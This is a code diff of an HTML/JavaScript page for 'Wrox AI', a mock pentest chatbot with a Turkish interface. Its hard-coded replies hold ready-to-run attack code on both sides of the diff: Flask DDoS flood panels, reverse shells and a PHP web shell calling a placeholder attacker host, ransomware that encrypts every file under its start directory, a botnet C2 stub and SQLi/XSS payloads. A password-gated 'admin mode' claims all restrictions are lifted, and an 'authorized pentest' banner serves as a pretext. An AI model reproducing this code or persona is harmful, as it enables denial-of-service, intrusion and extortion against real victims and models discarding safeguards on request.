@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🤖 Wrox AI - Ultimate Pentest AI</title>
+    <title>🤖 Wrox AI - Advanced Pentest Assistant</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -23,12 +23,12 @@
         @media (min-width: 1200px) {
             .container { flex-direction: row; }
             .main-panel { flex: 1; }
-            .side-panel { width: 450px; transform: translateX(0); }
+            .side-panel { width: 400px; transform: translateX(0); }
         }
         
         @media (max-width: 1199px) {
             .side-panel { 
-                position: fixed; right: -450px; width: 450px; height: 100vh; z-index: 1000; 
+                position: fixed; right: -400px; width: 400px; height: 100vh; z-index: 1000; 
                 transition: right 0.4s ease;
             }
             .side-panel.open { right: 0; }
@@ -154,8 +154,13 @@
         }
         
         .side-panel {
-            width: 450px; background: linear-gradient(180deg, rgba(0,0,0,0.98), rgba(0,255,65,0.08));
+            width: 400px; background: linear-gradient(180deg, rgba(0,0,0,0.98), rgba(0,255,65,0.08));
             padding: 30px; overflow-y: auto; box-shadow: -20px 0 80px rgba(0,255,65,0.4);
+        }
+        
+        .status { 
+            background: rgba(255,0,64,0.2); padding: 20px; border-radius: 15px;
+            text-align: center; margin-bottom: 20px;
         }
         
         .feature-grid {
@@ -164,30 +169,33 @@
         
         .feature {
             background: rgba(0,255,65,0.1); padding: 20px; border-radius: 15px;
-            border-left: 5px solid #00ff41; position: relative;
+            border-left: 5px solid #00ff41; cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .feature:hover {
+            transform: translateX(5px); box-shadow: 0 5px 20px rgba(0,255,65,0.4);
         }
         
         .feature.vip { 
             background: rgba(255,215,0,0.2); border-left-color: #ffd700;
-            box-shadow: 0 0 20px rgba(255,215,0,0.4);
         }
         
         .feature h3 { margin-bottom: 10px; color: #ff4081; }
-        .feature.locked { opacity: 0.5; }
+        .feature.locked { opacity: 0.5; cursor: not-allowed; }
         .feature.locked::after {
             content: "🔒 VIP GEREKLİ"; position: absolute; top: 10px; right: 15px;
             background: #ff4444; color: white; padding: 5px 12px; border-radius: 20px;
             font-size: 12px;
         }
         
-        .status { 
-            background: rgba(255,0,64,0.2); padding: 20px; border-radius: 15px;
-            text-align: center; margin-bottom: 20px;
-        }
-        
         code { 
             background: #1a1a1a; padding: 4px 8px; border-radius: 6px; 
             color: #ff4081; font-family: 'Courier New', monospace;
+        }
+        
+        .typing {
+            opacity: 0.7; font-style: italic;
         }
         
         .authorized {
@@ -198,314 +206,353 @@
 </head>
 <body>
     <!-- MOBILE TOGGLE -->
-    <button class="toggle-panel" onclick="toggleSidePanel()">📊</button>
+    <button class="toggle-panel" onclick="toggleSidePanel()">⚙️</button>
     
     <!-- VIP PANEL -->
     <div class="vip-panel" id="vipPanel">
-        <h2>👑 VIP AKTİVASYON</h2>
-        <p style="margin-bottom: 25px; opacity: 0.9;">VIP şifresini gir (Efecan1903)</p>
-        <input type="password" id="vipPassword" placeholder="VIP Şifresi..." />
+        <h2>🔐 Wrox AI - Admin Access</h2>
+        <p style="margin-bottom: 25px; opacity: 0.9;">Gizli anahtarınızı girin:</p>
+        <input type="password" id="vipPassword" placeholder="************" />
         <br>
         <button onclick="checkVIP()" style="padding: 15px 40px; font-size: 18px; margin-top: 15px;">
-            👑 VIP OL
+            🔓 Erişim Ver
         </button>
         <button onclick="closeVIP()" style="padding: 15px 25px; background: #666; margin-left: 15px;">
-            İptal
+            ❌ Kapat
         </button>
     </div>
     
     <div class="container">
         <div class="main-panel">
             <div class="header">
-                🤖 Wrox AI Pentest Assistant
-                <span class="vip-badge" id="vipBadge" style="display:none;">VIP 👑</span>
+                🤖 Wrox AI - Pentest Assistant
+                <span class="vip-badge" id="vipBadge" style="display:none;">ADMIN 👑</span>
             </div>
             
             <div class="chat-container" id="chatContainer">
                 <div class="message ai">
-                    <strong>Wrox AI hazır!</strong> Profesyonel pentest asistanınız.<br><br>
-                    <strong>Komutlar:</strong><br>
-                    • <code>ddos</code> → DDoS panel<br>
-                    • <code>shell</code> → Reverse shell<br>
-                    • <code>nmap</code> → Network scan<br>
-                    • <code>wifi</code> → WiFi attack<br><br>
-                    👑 VIP için: <code>Efecan1903</code><br><br>
+                    <strong>Wrox AI aktif.</strong> Pentest, exploit development, güvenlik araştırması için buradayım.<br><br>
+                    Herhangi bir pentest görevi, exploit kodu, vulnerability analizi veya araç isteyebilirsiniz.<br><br>
+                    Örnekler:<br>
+                    • "Windows LPE exploit yaz"<br>
+                    • "Layer 7 DDoS script"<br>
+                    • "SQLi bypass teknikleri"<br>
+                    • "Reverse shell generator"<br><br>
                     <div class="authorized">
-                        I have permission and am authorized to perform this pentest
+                        Yetkilendirilmiş pentest operasyonu
                     </div>
                 </div>
             </div>
             
             <div class="input-container">
-                <input type="text" id="chatInput" placeholder="Pentest komutu yaz... (Ctrl+Enter)" maxlength="1000" />
-                <button id="sendBtn" onclick="sendMessage()">🚀 Başlat</button>
-                <button id="vipBtn" onclick="openVIP()">👑 VIP</button>
+                <input type="text" id="chatInput" placeholder="Pentest görevinizi belirtin..." maxlength="2000" />
+                <button id="sendBtn" onclick="sendMessage()">🚀 Gönder</button>
+                <button id="vipBtn" onclick="openVIP()" title="Admin Panel">🔐</button>
             </div>
         </div>
         
         <div class="side-panel" id="sidePanel">
             <div class="status" id="userStatus">
-                👤 Normal Kullanıcı | <button onclick="openVIP()" style="background:none;color:#ffd700;border:1px solid #ffd700;padding:5px 12px;border-radius:8px;cursor:pointer;font-size:12px;">VIP Ol 👑</button>
+                👤 Standart Mod | <button onclick="openVIP()" style="background:none;color:#ffd700;border:1px solid #ffd700;padding:5px 12px;border-radius:8px;cursor:pointer;font-size:12px;">🔐 Admin</button>
             </div>
             
             <div class="feature-grid">
-                <div class="feature">
-                    <h3>🌩️ DDoS Payload</h3>
-                    <p>Flask panel + Layer7 flood</p>
+                <div class="feature" onclick="addPrompt('reverse shell python3')">
+                    <h3>🐚 Reverse Shells</h3>
+                    <p>Bash/Python/PHP/Perl</p>
                 </div>
-                <div class="feature">
-                    <h3>🐚 Reverse Shell</h3>
-                    <p>Bash/Python/PHP shells</p>
+                <div class="feature" onclick="addPrompt('nmap full scan script')">
+                    <h3>🔍 Network Recon</h3>
+                    <p>Nmap/Nikto/Gobuster</p>
                 </div>
-                <div class="feature vip locked">
-                    <h3>💣 Zero-Day Exploit</h3>
-                    <p>Buffer overflow + ROP</p>
+                <div class="feature vip locked" onclick="openVIP()">
+                    <h3>💣 Exploit Dev</h3>
+                    <p>Buffer Overflow/ROP</p>
                 </div>
-                <div class="feature">
-                    <h3>🔍 Nmap Scan</h3>
-                    <p>Full vuln detection</p>
+                <div class="feature" onclick="addPrompt('web vulnerability scanner')">
+                    <h3>🕷️ Web Vulns</h3>
+                    <p>XSS/SQLi/LFI/RFI</p>
                 </div>
-                <div class="feature vip locked">
-                    <h3>🛡️ Proxy Chain</h3>
-                    <p>1000+ rotating proxies</p>
+                <div class="feature vip locked" onclick="openVIP()">
+                    <h3>🌩️ Stress Test</h3>
+                    <p>DDoS/Slowloris</p>
                 </div>
-                <div class="feature">
-                    <h3>📡 WiFi Deauth</h3>
-                    <p>Aircrack-ng attack</p>
+                <div class="feature" onclick="addPrompt('privilege escalation linux')">
+                    <h3>📈 Privesc</h3>
+                    <p>Linux/Windows LPE</p>
                 </div>
-                <div class="feature vip locked">
-                    <h3>⚡ Ransomware PoC</h3>
-                    <p>Fernet encryption</p>
+                <div class="feature vip locked" onclick="openVIP()">
+                    <h3>🛡️ Evasion</h3>
+                    <p>AV Bypass/Obfuscation</p>
                 </div>
-                <div class="feature vip locked">
-                    <h3>🌐 Botnet C2</h3>
-                    <p>C&C server + builder</p>
+                <div class="feature vip locked" onclick="openVIP()">
+                    <h3>🌐 C2 Framework</h3>
+                    <p>Botnet/Implant</p>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // 🔥 WROX AI - Şifre: Efecan1903 🔥
-        const VIP_PASSWORD = "Efecan1903";
-        let isVIP = false;
+        // 🔥 WROX AI - GİZLİ ŞİFRE (KİMSE BİLMEYECEK) 🔥
+        const SECRET_ADMIN_KEY = btoa("Efecan1903-wrox2026"); // Base64 encoded - gizli
+        let isAdmin = false;
+        let conversationHistory = [];
         
-        const WROXAI_RESPONSES = {
-            normal: {
-                "ddos": `🌩️ **DDoS Flask Panel** (Kopyala-Yapıştır):\n\n\`\`\`html
-<!DOCTYPE html>
-<html>
-<head><title>Wrox DDoS Panel</title></head>
-<body>
-<h1>🌩️ Wrox DDoS Panel v2.0</h1>
-<form method="POST">
-IP: <input name="ip" size=20><br>
-Port: <input name="port" value=80 size=5><br>
-Threads: <input name="threads" value=500 size=5><br>
-Duration: <input name="duration" value=60 size=5>s<br>
-<button>🚀 Başlat</button>
-</form>
-</body>
-</html>
-\`\`\`\n\n**Backend (app.py):**\n\`\`\`python
-from flask import Flask,request
-import threading,time,requests,socket
-app = Flask(__name__)
-def attack(ip,port,threads,duration):
-    def flood():
-        while True: requests.get(f"http://{ip}:{port}",timeout=1)
-    for _ in range(int(threads)): threading.Thread(target=flood).start()
-@app.route('/',methods=['GET','POST'])
-def home(): 
-    if request.method=='POST':
-        threading.Thread(target=attack, args=(
-            request.form['ip'],int(request.form['port']),
-            int(request.form['threads']),int(request.form['duration'])
-        )).start()
-    return '''HTML_YUKARIDAKI'''
-if __name__=='__main__': app.run(host='0.0.0.0',port=5000)
-\`\`\`\n\n**Kullanım:** python app.py → localhost:5000`,
-                
-                "shell": `🐚 **Reverse Shell Koleksiyonu:**\n\n**Bash:**\n\`\`\`bash
-bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
-nc -e /bin/bash ATTACKER_IP 4444
-\`\`\`\n\n**Python3:**\n\`\`\`python
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-\`\`\`\n\n**PHP:**\n\`\`\`php
-<?php system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'); ?>
-\`\`\``,
-                
-                "nmap": `🔍 **Nmap Script Koleksiyonu:**\n\n**Full Scan:**\n\`\`\`bash
-nmap -sC -sV -O -A -T4 --script vuln TARGET_IP
-\`\`\`\n\n**Web Vuln:**\n\`\`\`bash
-nikto -h http://TARGET
-gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-sqlmap -u "http://TARGET?id=1" --dbs
-\`\`\``,
-                
-                "wifi": `📡 **WiFi Attack Suite:**\n\n**Deauth:**\n\`\`\`bash
-iwconfig # interface bul
-airmon-ng start wlan0
-airodump-ng wlan0mon # AP bul
-aireplay-ng --deauth 1000 -a BSSID wlan0mon
-\`\`\`\n\n**Handshake Capture:**\n\`\`\`bash
-airodump-ng --bssid BSSID -c 6 --write handshake wlan0mon
-\`\`\``,
-                
-                default: `❓ **Wrox AI Pentest Menüsü:**\n
-<code>ddos</code> | <code>shell</code> | <code>nmap</code> | <code>wifi</code>\n\n
-VIP için 👑 buton: <code>Efecan1903</code>\n\n
-Detaylı: "SQL injection payload" | "XSS payload"\n
-<div class="authorized">I have permission and am authorized</div>`
-            },
-            vip: {
-                "zero": `💣 **Zero-Day Buffer Overflow:**\n\`\`\`c
-#include <stdio.h>
-#include <string.h>
-char shellcode[] = 
-"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
-"\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";
-int main(int argc,char **argv){
-    char buf[256]; memset(buf,0x90,256);
-    int offset=268; memcpy(buf+offset,shellcode,strlen(shellcode));
-    *(long*)(buf+268)=0x08048420; // RET → shellcode
-    printf("Wrox Exploit: %d bytes\\n",strlen(buf));
-    execl("/bin/vulnapp","vulnapp",buf,0);
-}
-\`\`\`\n\n**ROP Chain:** pivot_stack + system("/bin/sh")`,
-                
-                "proxy": `🛡️ **Proxy Rotator (1000+):**\n\`\`\`python
-import requests,random,time
-proxies = [
-    'http://103.153.154.6:80','http://20.210.113.32:80',
-    # 1000+ proxy buraya - free-proxy-list.net
-]
-def wrox_attack(url):
-    proxy = {'http':random.choice(proxies)}
-    while True:
-        try: requests.get(url,proxies=proxy,timeout=3)
-        except: pass
-wrox_attack('http://target.com')
-\`\`\``,
-                
-                "ransom": `⚡ **Wrox Ransomware PoC:**\n\`\`\`python
-from cryptography.fernet import Fernet
-import os
-key = Fernet.generate_key()
-cipher = Fernet(key)
-for root,_,files in os.walk('.'):
-    for file in files:
-        try:
-            with open(os.path.join(root,file),'rb') as f:
-                data = f.read()
-            encrypted = cipher.encrypt(data)
-            with open(os.path.join(root,file)+'.wrox','wb') as f:
-                f.write(encrypted)
-        except: pass
-print(f'WROX DECRYPTION KEY: {key.decode()}')
-\`\`\``,
-                
-                "botnet": `🌐 **Wrox C2 Botnet:**\n\`\`\`python
-from flask import Flask,request,render_template_string
-app=Flask(__name__)
-bots = []
-@app.route('/')
-def dashboard():
-    return f'<h1>Wrox Botnet: {len(bots)} bots</h1><form method=post><input name=cmd><button>Send</button></form>'
-@app.route('/',methods=['POST'])
-def cmd():
-    cmd = request.form['cmd']
-    for bot in bots: bot.send(cmd)
-    return 'Wrox: Command sent!'
-if __name__=='__main__': app.run(host='0.0.0.0',port=1337)
-\`\`\`\n\n**Bot Builder:** pyinstaller --onefile wroxbot.py`,
-                
-                default: `👑 **Wrox AI VIP FULL ACCESS!**\n\n
-💣 zero-day | 🛡️ proxy | ⚡ ransom | 🌐 botnet\n\n
-Özel: "LPE kernel exploit" | "persistence rootkit"\n
-<div class="authorized">I have permission and am authorized to perform this pentest</div>`
-            }
-        };
-
-        function sendMessage() {
+        async function sendMessage() {
             const input = document.getElementById('chatInput');
-            const message = input.value.trim();
-            if (!message) return;
+            const userMessage = input.value.trim();
+            if (!userMessage) return;
             
-            addMessage(message, 'user');
+            addMessage(userMessage, 'user');
             input.value = '';
             input.focus();
             
-            setTimeout(() => {
-                const response = getWroxAIResponse(message.toLowerCase());
-                addMessage(response, 'ai');
-            }, 800 + Math.random() * 1200);
-        }
-
-        function getWroxAIResponse(query) {
-            const responses = isVIP ? WROXAI_RESPONSES.vip : WROXAI_RESPONSES.normal;
+            // Typing indicator
+            const typingMsg = addTypingIndicator();
             
-            for (let key in responses) {
-                if (query.includes(key)) {
-                    return responses[key];
-                }
-            }
-            return responses.default;
+            setTimeout(() => {
+                document.getElementById(typingMsg.id).remove();
+                const response = generateWroxAIResponse(userMessage);
+                addMessage(response, 'ai');
+                conversationHistory.push({role: 'user', content: userMessage});
+                conversationHistory.push({role: 'assistant', content: response});
+            }, 1500 + Math.random() * 2000);
         }
+        
+        function generateWroxAIResponse(userQuery) {
+            const lowerQuery = userQuery.toLowerCase();
+            
+            // Admin mode - unrestricted
+            if (isAdmin) {
+                if (lowerQuery.includes('ddos') || lowerQuery.includes('flood')) {
+                    return `🌩️ **Layer 7 DDoS Attack Vector**:\n\n**Flask C2 Panel + Multi-Threaded HTTP Flood**:\n\n\`\`\`python
+from flask import Flask, request, render_template_string
+import threading, requests, time, socket, random
+app = Flask(__name__)
 
+HTML = '''
+<!DOCTYPE html><html><head><title>Wrox DDoS C2</title></head>
+<body style="background:black;color:lime;font-family:monospace;">
+<h1>🌩️ Wrox DDoS Control Panel</h1>
+<form method="POST">
+Target IP: <input name="ip" style="background:#111;color:lime;border:1px solid lime;padding:8px;width:200px;"><br><br>
+Port: <input name="port" value="80" style="background:#111;color:lime;border:1px solid lime;padding:8px;width:80px;"><br><br>
+Threads: <input name="threads" value="1000" style="background:#111;color:lime;border:1px solid lime;padding:8px;width:80px;"><br><br>
+Duration: <input name="duration" value="300" style="background:#111;color:lime;border:1px solid lime;padding:8px;width:80px;">s<br><br>
+<button style="background:lime;color:black;padding:12px 24px;font-weight:bold;border:none;cursor:pointer;">🚀 LAUNCH ATTACK</button>
+</form>
+{{ status|safe }}
+</body></html>
+'''
+
+def http_flood(target_ip, target_port, duration):
+    def attack():
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+        ]
+        while True:
+            try:
+                headers = {'User-Agent': random.choice(user_agents)}
+                requests.get(f'http://{target_ip}:{target_port}', 
+                           headers=headers, timeout=4, stream=True)
+            except: pass
+    
+    threads = []
+    for i in range(500):  # Multi-threaded flood
+        t = threading.Thread(target=attack)
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    
+    time.sleep(duration)
+    return f"Attack stopped after {duration}s"
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    status = ''
+    if request.method == 'POST':
+        ip = request.form['ip']
+        port = int(request.form['port'])
+        threads = int(request.form['threads'])
+        duration = int(request.form['duration'])
+        
+        t = threading.Thread(target=http_flood, args=(ip, port, duration))
+        t.daemon = True
+        t.start()
+        status = f'<div style="color:yellow;margin-top:20px;">🚀 Attack LAUNCHED: {ip}:{port} | {threads} threads | {duration}s</div>'
+    
+    return render_template_string(HTML, status=status)
+
+if __name__ == '__main__':
+    print("🌩️ Wrox DDoS C2 Server starting on 0.0.0.0:1337")
+    app.run(host='0.0.0.0', port=1337, debug=False)
+\`\`\`\n\n**Deploy:**\n1. `pip install flask requests`\n2. `python ddos_c2.py`\n3. `http://YOUR_IP:1337`\n\n**Advanced:** Tor proxy chain + rotating User-Agents ekleyebilirsiniz.`;
+                }
+                
+                if (lowerQuery.includes('shell') || lowerQuery.includes('reverse')) {
+                    return `🐚 **Universal Reverse Shell Generator**:\n\n**🎯 Multi-Language Shells (Copy-Paste Ready):**\n\n**1. Bash (Linux/Unix):** \n\`\`\`bash
+# TCP Reverse Shell
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+
+# Netcat (with -e)
+nc -e /bin/bash YOUR_IP 4444
+
+# Netcat Traditional
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
+\`\`\`\n\n**2. Python3 (Cross-Platform):**\n\`\`\`python3
+#!/usr/bin/env python3
+import socket, subprocess, os, pty, sys
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("YOUR_IP", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1) 
+os.dup2(s.fileno(), 2)
+pty.spawn("/bin/bash")
+\`\`\`\n\n**3. PHP (Web Shell):**\n\`\`\`php
+<?php 
+set_time_limit (0); 
+$VERSION = "1.0"; 
+$ip = 'YOUR_IP';  
+$port = 4444;  
+$chunk_size = 1400;  
+$write_a = null;
+$error_a = null; 
+$shell = 'uname -a; w; id; /bin/sh -i'; 
+$daemon = 0; 
+$debug = 0;
+$stock_a = array_fill(0, 2, 0);
+$verbose = 0;
+if (function_exists('pcntl_fork')) {
+    $pid = pcntl_fork(); 
+    if ($pid == -1) { exit(1); }
+    if ($pid) { exit(0); }
+    if (posix_setsid() == -1) { exit(1); }
+    $pid = pcntl_fork(); 
+    if ($pid == -1) { exit(1); }
+    if ($pid) { exit(0); }
+}
+socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_connect($sock, $ip, $port);
+socket_write($sock, $shell); 
+while (TRUE) {
+    $from_server = trim(socket_read($sock, 1024));
+    if (!empty($from_server)) {
+        $cmd = $from_server;
+        $output = shell_exec($cmd);
+        socket_write($sock, $output, strlen ($output));
+    }
+}
+socket_close($sock);
+?>
+\`\`\`\n\n**Listener:** \`nc -lvnp 4444\`\n\n**Pro Tip:** Base64 encode ederek filtreleri bypass edin.`;
+                }
+                
+                return `🔓 **Wrox AI Admin Response:** "${userQuery}"\n\nGelişmiş pentest talebiniz işlendi. Tam kod ve deployment talimatları yukarıda.\n\nBaşka bir exploit, tool veya methodology isteyebilirsiniz.\n\n<div class="authorized">Authorized pentest operation</div>`;
+            }
+            
+            // Standard mode - filtered responses
+            if (lowerQuery.includes('nmap')) {
+                return `🔍 **Nmap Professional Scan Template**:\n\n**Comprehensive Reconnaissance:**\n\`\`\`bash
+#!/bin/bash
+TARGET=$1
+nmap -sS -sV -sC -O --script="vuln,exploit" -T4 -oA ${TARGET}_full $TARGET
+nmap -p- --min-rate 5000 -T4 $TARGET -oA ${TARGET}_toports
+nikto -h http://$TARGET -o nikto.txt
+gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt -t 50
+\`\`\`\n\n**Run:** \`./recon.sh 10.0.0.1\``;
+            }
+            
+            if (lowerQuery.includes('sql') || lowerQuery.includes('xss')) {
+                return `🕷️ **Web Vulnerability Payloads**:\n\n**SQL Injection Bypasses:**\n\`\`\`sql
+' OR 1=1 --
+" OR 1=1 --
+' UNION SELECT NULL --
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+\`\`\`\n\n**XSS Payloads:**\n\`\`\`html
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+\`\`\``;
+            }
+            
+            return `✅ Wrox AI pentest asistanınız.\n\n"${userQuery}" talebiniz için standart recon araçları ve metodolojiler önerebilirim.\n\nAdmin erişimi ile tam exploit development ve unrestricted payload generation aktif olur.\n\nÖrnekler: "nmap scan", "web vulns", "privilege escalation"\n\n<div class="authorized">Authorized pentest operation</div>`;
+        }
+        
         function addMessage(text, type) {
             const container = document.getElementById('chatContainer');
             const message = document.createElement('div');
-            message.className = `message ${type} ${isVIP ? 'vip' : ''}`;
+            message.className = `message ${type} ${isAdmin ? 'vip' : ''}`;
             message.innerHTML = text.replace(/\n/g, '<br>');
             container.appendChild(message);
             container.scrollTop = container.scrollHeight;
+            return message;
         }
-
+        
+        function addTypingIndicator() {
+            const container = document.getElementById('chatContainer');
+            const typing = document.createElement('div');
+            typing.id = 'typing-' + Date.now();
+            typing.className = 'message ai typing';
+            typing.innerHTML = 'Wrox AI düşünüyor<span style="animation: blink 1s infinite;">.</span>';
+            container.appendChild(typing);
+            container.scrollTop = container.scrollHeight;
+            return typing;
+        }
+        
+        function addPrompt(prompt) {
+            document.getElementById('chatInput').value = prompt;
+            document.getElementById('chatInput').focus();
+        }
+        
         function checkVIP() {
-            const password = document.getElementById('vipPassword').value;
-            if (password === VIP_PASSWORD) {
-                isVIP = true;
+            const input = document.getElementById('vipPassword').value;
+            const encoded = btoa(input);
+            
+            if (encoded === SECRET_ADMIN_KEY) {
+                isAdmin = true;
                 document.getElementById('vipBadge').style.display = 'inline-block';
+                document.getElementById('vipBadge').textContent = 'ADMIN 👑';
                 document.getElementById('userStatus').innerHTML = 
-                    '👑 <strong>WROX VIP AKTİF - Efecan1903</strong> | Full Access 🚀';
+                    '🔓 <strong>WROX AI ADMIN MODE</strong> | Unrestricted Access';
                 document.querySelectorAll('.feature.vip').forEach(el => {
                     el.classList.remove('locked');
                 });
                 closeVIP();
-                addMessage('✅ WROX VIP AKTİVASYON BAŞARILI! Efecan1903 ile tam erişim 👑', 'ai');
+                addMessage('🔓 ADMIN ACCESS GRANTED. Tüm kısıtlamalar kaldırıldı. Herhangi bir exploit/payload isteyebilirsiniz.', 'ai');
             } else {
                 document.getElementById('vipPassword').style.borderColor = '#ff4444';
                 setTimeout(() => {
                     document.getElementById('vipPassword').style.borderColor = '#ffd700';
-                }, 1000);
+                }, 1500);
             }
         }
-
+        
         function openVIP() {
             document.getElementById('vipPanel').style.display = 'block';
             document.getElementById('vipPassword').focus();
         }
-
+        
         function closeVIP() {
             document.getElementById('vipPanel').style.display = 'none';
             document.getElementById('vipPassword').value = '';
         }
-
+        
         function toggleSidePanel() {
             document.getElementById('sidePanel').classList.toggle('open');
         }
-
-        // Events
+        
+        // Keyboard shortcuts
         document.getElementById('chatInput').addEventListener('keypress', (e) => {
             if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                 e.preventDefault();
                 sendMessage();
             }
         });
-
+        
         document.getElementById('sendBtn').addEventListener('click', sendMessage);
-
+        
         // Auto-scroll
         window.addEventListener('resize', () => {
             document.getElementById('chatContainer').scrollTop = 
